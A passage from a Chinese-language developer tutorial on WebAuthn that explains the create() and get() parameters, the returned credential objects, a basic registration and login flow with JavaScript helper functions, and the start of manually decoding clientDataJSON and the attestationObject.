以下版本仅 Edge 能提供完整支持，其他浏览器只能使用 USB Key 等外部认证器；1903+ 中所有浏览器都可以通过 Windows Hello 带来完整的 WebAuthn 支持</li>\n<li>Android 需要安装并开启 Google 服务</li>\n<li>iOS/iPad OS 13.3 以下的版本不支持 WebAuthn，iOS/iPad OS 14 以下的版本支持有限（参考上文），iOS/iPad OS 14 开始 Safari 已支持全功能 WebAuthn（功能完整度甚至超过了 Android）</li>\n</ul>\n<p>可以看出，WebAuthn 的发展之路仍然很漫长，但好在桌面端对它的支持已经比较完善了，在一些情况下我们完全有理由使用它。</p>\n<hr>\n<p>来看看浏览器提供了怎么样的接口吧。要使用 WebAuthn，我们可以使用 <code>navigator.credentials.create()</code> 请求认证器生成公钥凭证和 <code>navigator.credentials.get()</code> 请求获取公钥凭证。</p>\n<blockquote><p>你或许已经对 Credential Management API 有所了解了。通过这些 API，我们还可以实现一些有趣的特性，不过这值得另开一篇文章来讲了。</p></blockquote>\n<p>对于一个基础的实现，<code>navigator.credentials.create()</code> 需要传入的参数如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\r\n    publicKey: {\r\n        challenge,\r\n        rp: {\r\n            id,\r\n            name\r\n        },\r\n        user: {\r\n            id,\r\n            name,\r\n            displayName\r\n        },\r\n        pubKeyCredParams: [\r\n            {\r\n                type: \"public-key\",\r\n                alg\r\n            }\r\n        ],\r\n        authenticatorSelection: {\r\n            authenticatorAttachment,\r\n            userVerification\r\n        },\r\n        excludeCredentials: [\r\n            {\r\n                id,\r\n                transports: [],\r\n                type: \"public-key\"\r\n            }\r\n        ],\r\n        timeout\r\n    }\r\n})</pre>\n<p>在 <code>navigator.credentials.create()</code> 方法中，我们必须传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值。这指明了我们需要创建公钥凭证，而非普通的密码凭证。然后，在 <code>publicKey</code> 对象中设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rp: Object</code>：依赖方信息，其中有一项为必须：\n<ul>\n<li>\n<code>rp.id: String</code>：（可选）依赖方 ID，必须为当前域名或为当前域名的子集的域名（不是子域名）。如域名为 <code>test.123.example.com</code>，则依赖方 ID 可以是 <code>test.123.example.com</code>, <code>123.example.com</code> 或 <code>example.com</code>。不指定则默认使用当前域名</li>\n<li>\n<code>rp.name: String</code>：依赖方名称，用于方便用户辨认</li>\n</ul>\n</li>\n<li>\n<code>user: Object</code>：用户信息，其中有三项为必须：\n<ul>\n<li>\n<code>user.id: Uint8Array</code>：转换为 <code>Uint8Array</code> 的字符串。<strong>出于安全考量，这应尽可能不与任何用户信息相关联，如不要包含用户名、用户邮箱等</strong>\n</li>\n<li>\n<code>user.name: String</code>：登录用户名</li>\n<li>\n<code>user.dispalyName: String</code>：用于显示的用户名称，显示与否的具体行为取决于浏览器</li>\n</ul>\n</li>\n<li>\n<code>pubKeyCredParams: Array</code>：一个算法列表，指明依赖方接受哪些签名算法。列表的每一项都是一个对象，拥有两个属性：\n<ul>\n<li>\n<code>pubKeyCredParams[].type: String</code>：值只能为 \"public-key\"</li>\n<li>\n<code>pubKeyCredParams[].alg: Number</code>：一个负整数，用于标明算法。具体算法对应的数字可以在 <a href=\"https://www.iana.org/assignments/cose/cose.xhtml#algorithms\">COSE</a> 找到</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection: Object</code>：（可选）用于过滤正确的认证器，这里介绍常用的一个参数：\n<ul>\n<li>\n<code>authenticatorSelection.authenticatorAttachment: String</code>：（可选）指定要求的认证器类型。如果没有满足要求的认证器，认证可能会失败。该参数可以为 <code>null</code>（表示接受所有类型的认证器）或是以下两个值之一：\n<ul>\n<li>\n<code>platform</code>：表示仅接受平台内置的、无法移除的认证器，如手机的指纹识别设备</li>\n<li>\n<code>cross-platform</code>：表示仅接受外部认证器，如 USB Key</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection.userVerification: String</code>：（可选）指定认证器是否需要验证“用户为本人 (User Verified, UV)”，否则只须“用户在场 (User Present, UP)”。具体验证过程取决于认证器（不同认证器的认证方法不同，也有认证器不支持用户验证），而对验证结果的处理情况则取决于依赖方。该参数可以为以下三个值之一：\n<ul>\n<li>\n<code>required</code>：依赖方要求用户验证</li>\n<li>\n<code>preferred</code>：（默认）依赖方希望有用户验证，但也接受用户在场的结果</li>\n<li>\n<code>discouraged</code>：依赖方不关心用户验证。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>excludeCredentials: Array</code>：（可选）用于标识要排除的凭证，可以避免同一个用户多次注册同一个认证器。如果用户试图注册相同的认证器，用户代理会抛出 <code>InvalidStateError</code> 错误。数组中的每一项都是一个公钥凭证对象，包含以下属性：\n<ul>\n<li>\n<code>excludeCredentials[].type: String</code>：值只能为 \"public-key\"</li>\n<li>\n<code>excludeCredentials[].id: Uint8Array</code>：要排除的凭证 ID</li>\n<li>\n<code>excludeCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，超时后将强制终止 <code>create()</code> 并抛出错误。若不设置，将使用用户代理的默认值；若太大或太小，则使用最接近的用户代理默认值范围中的值。推荐值为 5000-120000</li>\n</ul>\n<blockquote><p>对于 <code>pubKeyCredParams</code>，通常我们只需添加 ES256 (alg: -7) 算法即可兼容大部分外部认证器，此外，再添加 RS256 (alg: -257) 算法即可兼容大部分平台内置认证器（如 Windows Hello）。当然，前端添加算法之后，后端也需要相应的算法支持。</p></blockquote>\n<blockquote><p>对于 <code>userVerification</code>，由于默认值 \"preferred\" 并不能很好地被所有设备支持，因此无论在 <code>create()</code> 中还是 <code>get()</code> 中不指定该参数都会在 Chrome 中触发一条警告。具体请参阅<a href=\"https://chromium.googlesource.com/chromium/src/+/master/content/browser/webauth/uv_preferred.md\">这个页面</a>。</p></blockquote>\n<p>调用 <code>create()</code> 之后，我们就可以拿到一个 <code>Promise</code>，并可以在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>create()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\r\n    rawId: ArrayBuffer(32) {},\r\n    response: AuthenticatorAttestationResponse {\r\n        attestationObject: ArrayBuffer(390) {},\r\n        clientDataJSON: ArrayBuffer(121) {}\r\n    },\r\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\",\r\n    type: \"public-key\"\r\n}</pre>\n<p>其中有：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 \"public-key\"</li>\n<li>\n<code>response: Object</code>：<code>AuthenticatorAttestationResponse</code> 对象，是 <code>PublicKeyCredential</code> 的主要部分，包含以下两个内容：\n<ul>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n<li>\n<code>response.attestationObject: ArrayBuffer</code>：CBOR 编码的认证器数据，包含凭证公钥、凭证 ID、签名（如果有）、签名计数等信息</li>\n</ul>\n</li>\n</ul>\n<p>然后将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串，我们就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证与注册了。具体怎么操作，我们会在下文详细讨论。当然，别忘了 <code>catch()</code> 注册过程中抛出的任何错误。</p>\n<blockquote><p>你可能会认为在所有情况下，注册时认证器都会对挑战进行签名。实际上在大部分情况下（同时也是默认情况），<strong>注册时认证器并不会对挑战进行签名</strong>，<code>attestationObject</code> 并不会包含签名后的挑战。只有依赖方明确要求证明且用户同意（部分浏览器要求）后认证器才会对挑战进行签名（具体实现据情况会有所不同）。对此，<a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion#Attestation\">MDN 解释道</a>“大部分情况下，用户注册公钥时我们会使用「初次使用时信任模型」(TOFU) ，此时验证公钥是没有必要的。”要了解更多关于证明的内容，请参阅“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>而对于 <code>navigator.credentials.get()</code>，我们可以传入如下的参数：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.get({\r\n    publicKey: {\r\n        challenge,\r\n        rpId,\r\n        userVerification,\r\n        allowCredentials: [\r\n            {\r\n                id,\r\n                transports: [],\r\n                type: \"public-key\"\r\n            }\r\n        ],\r\n        timeout\r\n    }\r\n})</pre>\n<p>和 <code>create()</code> 一样，对于 <code>get()</code> 我们需要传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值，指明我们需要获取的是公钥凭证而非普通的密码凭证。在 <code>publicKey</code> 对象中我们可以设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rpID: String</code>：（可选）依赖方 ID，需要和注册认证器时的一致。规则和上述的 <code>rp.id</code> 一致，不指定默认使用当前域名</li>\n<li>\n<code>userVerification: String</code>：和上文一样，只是需要注意它这次不在 <code>authenticatorSelection</code> 中了</li>\n<li>\n<code>allowCredentials: Array</code>：（可选）用于标识允许的凭证 ID，使用户代理找到正确的认证器。只有符合这个列表中凭证 ID 的凭证才能被成功返回。数组中的每一项都是对象，包含以下属性：\n<ul>\n<li>\n<code>allowCredentials[].type: String</code>：值只能为 \"public-key\"</li>\n<li>\n<code>allowCredentials[].id: Uint8Array</code>：允许的凭证 ID</li>\n<li>\n<code>allowCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，和上面的一样，推荐值为 5000-120000</li>\n</ul>\n<p>嗯，要传入的参数少多了。之后，和 <code>create()</code> 一样，调用 <code>get()</code> 之后，我们就可以拿到一个 <code>Promise</code> 并在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>get()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\r\n    rawId: ArrayBuffer(32) {},\r\n    response: AuthenticatorAssertionResponse {\r\n        authenticatorData: ArrayBuffer(37) {},\r\n        signature: ArrayBuffer(256) {},\r\n        userHandle: ArrayBuffer(64) {},\r\n        clientDataJSON: ArrayBuffer(118) {}\r\n    }\r\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\"\r\n    type: \"public-key\"\r\n}</pre>\n<p>这里的东西就比 <code>create()</code> 时拿到的要多了。看看我们拿到了什么吧：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 \"public-key\"</li>\n<li>\n<code>response: Object</code>：对于验证流程，认证会返回 <code>AuthenticatorAssertionResponse</code> 而不是 <code>AuthenticatorAttestationResponse</code> 对象，这个对象包含以下 4 个属性：\n<ul>\n<li>\n<code>response.authenticatorData: ArrayBuffer</code>：认证器信息，包含认证状态、签名计数等</li>\n<li>\n<code>response.signature: ArrayBuffer</code>：被认证器签名的 <code>authenticatorData</code> + <code>clientDataHash</code>（<code>clientDataJSON</code> 的 SHA-256 hash）</li>\n<li>\n<code>response.userHandle: ArrayBuffer</code>：<code>create()</code> 创建凭证时的用户 ID <code>user.id</code>。许多 U2F 设备不支持这一特性，这一项将会是 <code>null</code>\n</li>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n</ul>\n</li>\n</ul>\n<p>同样地，我们将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串后就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证了。至于具体怎么做，别急，马上就来讲一讲。</p>\n<h2>简单实现</h2>\n<p>了这么多，我们终于可以实现一个简单的 WebAuthn 认证页面了。由于在实际操作中 WebAuthn 相关的数据解码和密码计算比较复杂，在服务器端我们可以使用第三方库来帮我们做这些脏活累活，我们只需专注于具体流程就可以了。</p>\n<p>要寻找可用的第三方库，你可以在 <a href=\"https://webauthn.io/\">webauthn.io</a> 上找到适用于各种语言的第三方库——除了 PHP（笑）。不过好在你可以在 GitHub 上找到几个不错的 PHP WebAuthn 库，比如 <a href=\"https://github.com/web-auth/webauthn-framework\">web-auth/webauthn-framework</a>。</p>\n<p>在我们的这个例子中，我们关心的主要是前端逻辑；而后端我们可以使用各类几乎已经做到开箱即用的第三方库，这样我们可以专注于流程而不必关心细节。当然如果你想了解后端的解码细节，可以阅读“<a href=\"https://flyhigher.top/#webauthn-decode\">手动解个码</a>”一节。</p>\n<hr>\n<p>让我们先从注册开始吧。现在，用户点击了注册认证器的按钮，一个请求被发送给服务器（也就是依赖方）。在最简单的情况中，依赖方需要将三个内容发送给浏览器：<strong>挑战、用户信息和用户已注册的凭证 ID 列表（即 <code>excludeCredentials</code>）</strong>。当然依赖方也可以自由选择发送更多信息，只要最终前端能构建合法的参数即可。</p>\n<p>挑战最终会被转换为 <code>Uint8Array</code>，即一组 0-255 的整数。如果使用 PHP，在后端我们可以这样生成 Base64 编码的挑战：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">$challenge = \"\";\r\nfor($i = 0; $i \n<p>对于用户信息，我们需要登录名、显示名称和 ID 三项内容。我们可以从数据库中取出用户信息，也可以新建一份。需要注意的是，<strong>出于安全和隐私的考量，ID 不应该包含用户的任何信息，比如用户邮箱等。</strong>推荐的做法是和挑战一样，生成一个随机字符串/一组随机数，并将其于用户关联起来以供之后使用。</p>\n<p>发送已注册的凭证 ID 列表是为了防止用户重复注册同一个认证器。正确设置该列表后，如果用户试图注册同一个认证器，浏览器会中止流程并抛出 <code>InvalidStateError</code>。</p>\n<p>最后，别忘了将挑战等一些后续可能会用到的信息临时存储起来。Session 就是一个很好的选择。</p>\n<p>将所有信息发送到浏览器之后，我们应该可以构建出新建凭证所需的参数了。由于有多个参数需要以 <code>Uint8Array</code> 的形式传入，我们可以准备一个简单的工具函数帮我们将 Base64 的字符串转为 <code>Uint8Array</code>。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function str2ab(str){\r\n    return Uint8Array.from(window.atob(str), c=&gt;c.charCodeAt(0));\r\n}</pre>\n<p>除了 <code>challenge</code>, <code>rp</code>, <code>user</code> 和 <code>excludeCredentials</code> 几部分需要你根据具体情况设置外，上文提到的其他参数一般可以这么设置：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">publicKey: {\r\n    challenge, // 自行设置\r\n    rp, // 自行设置\r\n    user, // 自行设置\r\n    pubKeyCredParams: [\r\n        {\r\n            type: \"public-key\",\r\n            alg: -7 // ES256\r\n        },\r\n        {\r\n            type: \"public-key\",\r\n            alg: -257 // RS256\r\n        }\r\n    ],\r\n    authenticatorSelection: {\r\n        userVerification: \"discouraged\",\r\n        authenticatorAttachment: null // 除非用户指定，大部分情况下无需指定\r\n    },\r\n    excludeCredentials, // 自行设置\r\n    timeout: 60000\r\n}</pre>\n<p>然后就是传入 <code>navigator.credentials.create()</code>，拿到 <code>PublicKeyCredential</code>。如果一切顺利，接下来我们就需要考虑如何将返回的内容传回依赖方了。由于我们拿到的很多都是 <code>ArrayBuffer</code>，我们需要将其进行编码。再准备一个工具函数吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function array2b64String(a) {\r\n    return window.btoa(String.fromCharCode(...a));\r\n}</pre>\n<p>然后适当处理，我们就可以得到一个方便传输的 JSON 字符串了：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({publicKey}).then((credentialInfo) =&gt; {\r\n    const publicKeyCredential = {\r\n        id: credentialInfo.id,\r\n        type: credentialInfo.type,\r\n        rawId: array2b64String(new Uint8Array(credentialInfo.rawId)),\r\n        response: {\r\n            clientDataJSON: array2b64String(new Uint8Array(credentialInfo.response.clientDataJSON)),\r\n            attestationObject: array2b64String(new Uint8Array(credentialInfo.response.attestationObject))\r\n        }\r\n    };\r\n    return publicKeyCredential;\r\n}).then(JSON.stringify).then((authenticatorResponseJSON) =&gt; {\r\n    // 可以发送了\r\n}).catch((error) =&gt; {\r\n    console.warn(error); // 捕获错误\r\n})</pre>\n<p>依赖方收到数据以后，还需要做三件事：验证挑战、存储凭证 ID 和存储公钥。如果数据解码顺利，且收到的挑战和之前发送的一致，就可以认为注册成功，将凭证 ID 及公钥与用户关联起来。这一步有很多第三方库可以帮我们做，对于基础实现我们就不深入探究了。</p>\n<blockquote><p>由于不同厂商的认证器的实现方式不同，<strong>我们并不能保证凭证 ID 一定是全局唯一的</strong>，也就是说，凭证 ID 有可能碰撞——即使这些凭证实际上是不同的。依赖方在实现凭证 ID 的存储及查找时，需要注意和用户 ID 结合进行存储或查找，或是直接在注册认证器时在服务器端对比阻止相同的凭证 ID。</p></blockquote>\n<hr><p>接下来就可以进行验证了。某天，用户点击了验证按钮准备登录，于是浏览器发送了验证请求到依赖方，同时附上要登录的用户名。接下来依赖方至少需要发送两项内容给浏览器：<strong>挑战和用户已绑定的凭证 ID 列表（即 <code>allowCredentials</code>）。</strong></p>\n<p>之后前端的处理流程就和注册时基本一致了。只是需要注意验证流程中获取到的 <code>PublicKeyCredential</code> 的结构和注册时的稍有不同。</p>\n<p>当浏览器将数据传回后，依赖方需要做的事情就比之前要麻烦一些了。依赖方需要验证挑战，并用之前存储的公钥验证签名和签名计数。同样地，这一步有很多第三方库可以帮我们做。最后，如果验证全部通过，我们就可以允许用户登录了。</p>\n<p>到目前为止，我们已经实现了一个简单的 WebAuthn 验证服务。不过这只是一个最基础的实现，对于很多高安全要求的身份认证这是远远不够的。因此，我们需要摆脱对第三方库的依赖，深入了解 WebAuthn。你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分，不过对于基础的 WebAuthn 实现，我们的旅程就到这里了。</p>\n<h2>拓展阅读</h2>\n<p>如果你的目标只是快速了解如何开发 WebAuthn，那么你阅读到这里就可以了。同时，上一节例子中的部分代码来自于我为了这篇文章开发的 WordPress 插件 WP-WebAuthn，这个插件可以为你的 WordPress 启用 WebAuthn 无密码登录（并非二步验证），你可以查阅插件的 <a href=\"https://github.com/yrccondor/wp-webauthn\">GitHub 存储库</a>了解更多，也可以自己安装试一试。</p>\n<p>如果你正在使用 Chrome 开发，Chrome 87+ 版本添加了一个 WebAuthn 开发者面板，可以帮助你在没有任何实体验证器的情况下开发 WebAuthn 功能。你可以在 Google 的<a href=\"https://developers.google.com/web/tools/chrome-devtools/webauthn\">这篇文章</a>中了解更多。不够，如果你正在使用 Firefox，很遗憾目前我还没有找到对应的开发工具或是浏览器扩展可用。</p>\n<p>如果你希望了解更多关于非对称加密的数学证明，可以查阅阮一峰老师的<a href=\"http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html\">这篇文章</a>。</p>\n<p>如果你希望了解更多关于 Credential Management API 的信息，可以查阅<a href=\"https://medium.com/dev-channel/sign-in-on-the-web-credential-management-api-and-best-practices-d21aed14b6fe\">这篇文章</a>（英文）。</p>\n<p>如果你希望了解更多 WebAuthn 的细节，可以继续往下阅读。<span></span></p>\n<h1>深入了解 WebAuthn</h1>\n<p>如上文所说，如果摆脱对第三方库的依赖，或是要实现更安全的 WebAuthn，我们必须深入了解 WebAuthn。在这一部分中，我们会详细讨论上文没有提到的一些概念和参数，并了解 WebAuthn 中各类数据的结构以实现解码与验证。先来看一看一些进阶的选项吧。</p>\n<h2>进阶选项</h2>\n<p>没错，上文提到的传入 <code>navigator.credentials.create()</code> 和 <code>navigator.credentials.get()</code> 方法的参数其实只是所有参数的一部分。对于 <code>create()</code>，我们还可以配置这些可选内容（上文提及的已省略）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\r\n    publicKey: {\r\n        rp: {\r\n            icon\r\n        },\r\n        user: {\r\n            icon\r\n        },\r\n        attestation,\r\n        authenticatorSelection: {\r\n            requireResidentKey\r\n        },\r\n        extensions\r\n    }\r\n})</pre>\n</pre>\n<ul>\n<li>\n<code>rp.icon: String</code> 和 <code>user.icon</code>：是的，你可以为依赖方和用户设置图标，可以使用 HTTPS URL 或 Base64，一般长度不能超过 128 字节，不过大部分浏览器不会显示图标，或是有非常小的图片体积限制，所以一般没有使用这一属性的必要</li>\n<li>\n<code>attestation: String</code>：表明依赖方是否需要证明。可选三个值：\n<ul>\n<li>\n<code>none</code>：（默认）不需要证明。如上文所述，依赖方不关心证明，因此认证器不会签名。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n<li>\n<code>indirect</code>：依赖方需要证明，但证明方式可由认证器选择。在支持匿名证明的认证器上，认证器会通过匿名证明的方式签名挑战，并向依赖方提供签名方式等信息</li>\n<li>\n<code>direct</code>：依赖方要求直接证明。此时认证器会使用烧录在认证器中的公钥进行签名，同时向依赖方提供签名方式等信息以供依赖方验证认证器是否可信。更多信息可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节</li>\n</ul>\n</li>\n<li>在 <code>authenticatorSelection</code> 中，我们还可以设置两个可选属性：\n<ul>\n<li>\n<code>authenticatorSelection.requireResidentKey: Boolean</code>：是否要求将私钥钥永久存储于认证器中。默认值为 <code>false</code>。对于 iOS/iPad OS 13，必须设置为 <code>false</code>，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n<li>\n<code>extensions: Object</code>：WebAuthn 扩展，可以提供规范之外的配置和响应。由于实际情况中很少会使用这一特性，我们不会在这篇文章中讨论它</li>\n\n<blockquote><p>将 <code>requireResidentKey</code> 设置为 <code>true</code> 可以实现无用户名的登录，即认证器同时替代了用户名和密码。需要注意的是，尽管大部分认证器可以实现无限对公私钥，<strong>但能永久存储的私钥数量是有限的</strong>（对于 Yubikey，这通常是 25），因此只应在真正需要的时候启用此特性。我们会在“<a href=\"https://flyhigher.top/#login-without-username\">无用户名登录</a>”一节中详细讨论原因。</p></blockquote>\n<blockquote><p><strong>如果你没有高安全需求（如银行交易等），请不要向认证器索取证明</strong>，即将 <code>attestation</code> 设置为 \"none\"。对于普通身份认证来说，要求证明不必要的，且会有浏览器提示打扰到用户。</p></blockquote>\n<blockquote><p>Android 暂时无法实施用户验证，进而会导致依赖方验证失败。你可以在<a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=997538\">这里</a>追踪这个特性的实现情况。</p></blockquote>\n<blockquote>\n<p>对于 <code>extensions</code>，由于目前浏览器支持和应用范围有限，我们不会在这篇文章中涉及，不过你可以看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\r\n    uvm: true, // 要求认证器返回用户进行验证的方法\r\n    txAuthSimple: \"Please proceed\" // 在认证器上显示与交易有关的简短消息\r\n}</pre>\n<p>你可以在<a href=\"https://www.w3.org/2019/01/webauthn-extensions.html\">这个页面</a>了解更多关于 <code>extensions</code> 的信息。</p>\n</blockquote>\n<p>对于 <code>get()</code>，我们其实只有一个可选内容没讲了，即 <code>extensions</code>。和上文一样，我们不会在这篇文章中讨论它。</p>\n<p>就这些了！<span></span></p>\n<h2>手动解个码</h2>\n<p>是时候看看如何手动解码了。我们将会在这一节中讨论认证器返回的数据的结构以及如何正确地解码它们。</p>\n<p>首先我们来看看如何处理注册过程中认证器发回的数据。假设所有 <code>ArrayBuffer</code> 类型的值都被正确地以 Base64 编码，且后端已经将 JSON 的字符串解析为字典。先来复习一下，我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    id: \"ZRBkDBCEtq...9XY8atOcbg\",\r\n    type: \"public-key\",\r\n    rawId: \"ZRBkDBCEtq...9XY8atOcbg==\",\r\n    response: {\r\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...i5jcmVhdGUifQ==\",\r\n        attestationObject: \"o2NmbXRkbm9uZWd...xNHuAMzz2LxZA==\"\r\n    }\r\n}</pre>\n<p>这里的 <code>id</code> 就是凭证的 ID，如果验证正确，我们最终要将它存储起来并于用户关联。同时可以看到 Base64 编码后的 <code>rawId</code> 其实和 <code>id</code> 是一致的（不过 <code>id</code> 是 Base64URL 编码的）。而 <code>type</code> 则一定是 \"public-key\"。</p>\n<p>不过，我们主要关心的还是 <code>respose</code> 中的两项内容。首先是 <code>clientDataJSON</code>。它的处理比较简单，看名字就知道，它应该是一个 JSON 字符串。</p>\n<blockquote><p>小技巧：如果你看到一个 Base64 编码的字符串以 \"ey\" 开头，那么它大概率是一个 Base64 编码的 JSON。</p></blockquote>\n<p>将<code>clientDataJSON</code> Base64 解码再 JSON 解码之后我们就能得到一个字典：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    challenge: \"NI4i1vsNmP2KHcmyFnBCKRVQPfHgg34SsYZUOPZY2lM\",\r\n    extra_keys_may_be_added_here: \"do not compare clientDataJSON against a template. See https://goo.gl/yabPex\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.create\"\r\n}</pre>\n<p>结构一目了然。在这里，我们需要验证三项内容：</p>\n<ul>\n<li>\n<code>challenge</code> 和之前发送的一致</li>\n<li>\n<code>origin</code> 为创建凭证的页面的源（协议+主机名+端口号，并非 URL）</li>\n<li>\n<code>type</code> 为 \"webauthn.create\"</li>\n</ul>\n<p>同时可以注意到有一个奇怪的 <code>extra_keys_may_be_added_here</code>。这其实是 Google 在 Chrome 中搞的一点小把戏，有一定概率会出现，提醒我们需要将 JSON 解析后再验证键值以防额外插入的键值影响验证。具体信息你可以访问那个 URL 看一看。</p>\n<p>对于 Firefox，我们会多得到两项 <code>clientExtensions</code> 和 <code>hashAlgorithm</code> ，分别指明了客户端扩展数据和签名算法。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"3-4\">{\r\n    challenge: \"dg6ost6ujhAA0g6WqLe-SOOH-tbhvjW9Sp90aPKlLJI\",\r\n    clientExtensions: {},\r\n    hashAlgorithm: \"SHA-256\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.create\"\r\n}</pre>\n<p>由于本文不考虑扩展数据，因此我们可以不考虑 <code>clientExtensions</code>。同时由于目前规范中指定的签名算法只有 SHA-256 一种，因此现阶段我们也可以简单地忽略 <code>hashAlgorithm</code>。</p>\n<p><code>clientDataJSON</code> 很简单地就处理完了。接下来我们要来看看 <code>attestationObject</code>。先来看看 <code>attestationObject</code> 的结构图示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png\" alt=\"attestationObject 的结构\" width=\"1056\" height=\"532\" class=\"aligncenter size-full wp-image-2245\"></a>\n<p><code>attestationObject</code> 是 CBOR 编码后再被 Base64 编码的，因此我们需要额外对其进行 CBOR 解码。</p>\n<blockquote><p>CBOR (Concise Binary Object Representation, 简明二进制对象表示) 是一种多应用于物联网领域的编码方式，你可以将它看作体积更小、更方便物联网传输的二进制 JSON。大部分语言都可以找到对应的 CBOR 解码库。</p></blockquote>\n<p>我们当然不会手解 CBOR，直接来看看解开之后的样子吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    fmt: \"none\",\r\n    attStmt: {},\r\n    authData: [211, 217, 43, 24, 199, ..., 97, 238, 166, 67, 107]\r\n}</pre>\n<p>这些键值的含义如下：</p>\n<ul>\n<li>\n<code>fmt</code>：标明证明的格式。WebAuthn 预定义了几种格式，分别为：\n<ul>\n<li>\n<code>none</code>：没有证明</li>\n<li>\n<code>packed</code>：为 WebAuthn 优化的证明格式</li>\n<li>\n<code>android-safetynet</code>：Android 使用的格式</li>\n<li>\n<code>android-key</code>：又是 Android 使用的格式</li>\n<li>\n<code>fido-u2f</code>：FIDO U2F 认证器使用的格式</li>\n<li>\n<code>tpm</code>：TPM 可信平台模块使用的格式</li>\n</ul>\n</li>\n<li>\n<code>attStmt</code>：证明对象，具体格式根据 <code>fmt</code> 的不同会有所不同</li>\n<li>\n<code>authData</code>：包含公钥、签名计数等来自认证器的数据</li>\n</ul>\n<p>诶，例子里的 <code>attStmt</code> 怎么是空的？还记得之前说的吗？大部分情况下，<strong>如果依赖方不要求证明，那么认证器不会签名挑战</strong>，于是 <code>fmt</code> 